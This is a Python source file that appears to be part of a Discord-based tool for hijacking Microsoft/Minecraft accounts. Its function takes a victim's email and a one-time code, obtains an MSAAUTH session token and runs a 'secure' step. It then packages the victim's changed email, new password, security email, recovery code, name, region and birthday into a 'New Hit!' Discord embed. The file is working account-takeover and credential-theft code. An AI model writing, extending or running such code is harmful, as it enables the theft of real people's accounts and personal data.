from views.utils.getMSAAUTH import getMSAAUTH

from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.getWLSSC import getWLSSC
from views.utils.securing.secure import secure

from discord import Embed

import json
import time

def startSecuringAccount(email: str, device: str = None, code: str = None):
    if not device:
        device = json.load(open("data.json", "r+"))["flowtoken"] 
    
    data = getLiveData() # {urlPost, ppft, cookies, headers}

    print(f"PPFT: {data["ppft"]}")

    # str or None | dict
    # urlPost, ppft
    msaauth = getMSAAUTH(email, device, data, code)

    # print(f"urlPost: {urlPost}")
    # print(f"PPFT: {ppft}")
    # WLSSC = getWLSSC(msaauth, urlPost, ppft)
    
    if not msaauth:
        print("[-] - Failed to get MSAAUTH")
        return None
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    initialTime = time.time()
    account = secure(msaauth)
    print(account)

    finalTime = (time.time() - initialTime)

    info_embed = Embed()

    info_embed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    info_embed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    info_embed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)

    hit_embed = Embed(
        title = f"New Hit!",
        color = 0xE4D00A
    )

    # Once primaryEmail is done oldEmail -> Email
    hit_embed.add_field(name="👤 Username", value=f"```{account['oldName']}```", inline=False)
    hit_embed.add_field(name="🛠 Method", value=f"```{account['method']}```", inline=True)
    hit_embed.add_field(name="🎽 Capes", value=f"```{account['capes']}```", inline=True)
    hit_embed.add_field(name="📧 Old Email", value=f"```{account['oldEmail']}```", inline=False)
    hit_embed.add_field(name="📧 Email", value=f"```{account['email']}```", inline=False)
    hit_embed.add_field(name="📩 Security Email", value=f"```{account['secEmail']}```", inline=True)
    hit_embed.add_field(name="🔒 Password", value=f"```{account['password']}```", inline=False)
    hit_embed.add_field(name="🧯 Recovery Code", value=f"```{account['recoveryCode']}```", inline=False)
    hit_embed.set_footer(text = f"Took {round(finalTime, 2)} seconds securing!")

    if account["method"] == "Purchased":        
        hit_embed.set_thumbnail(url = f"https://mineskin.eu/avatar/{account["oldName"]}")
        hit_embed.color = 0x50C878
    
    return [
        hit_embed,
        info_embed
    ]